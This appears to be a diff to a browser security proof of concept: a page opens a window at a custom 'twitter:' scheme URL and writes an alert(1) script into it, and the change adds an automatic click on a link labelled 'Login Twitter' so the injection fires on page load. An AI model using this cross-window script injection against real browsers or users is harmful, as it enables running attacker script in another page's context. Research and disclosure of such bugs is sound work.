@@ -1,10 +1,14 @@
 <script>
     function f() {
-        w = open(`twitter.com:`, 'win')
+        w = open(`twitter:`, 'win')
         setTimeout(() => {
             w.document.write("<script>alert(1)\<\/script\>")
         }, 2000)
     }
 </script>
 
-<a href="#" onclick="f()">Login Twitter</a>
+<a id = 'anch' href="#" onclick="f()">Login Twitter</a>
+
+<script>
+    document.getElementById('anch').click();
+</script>
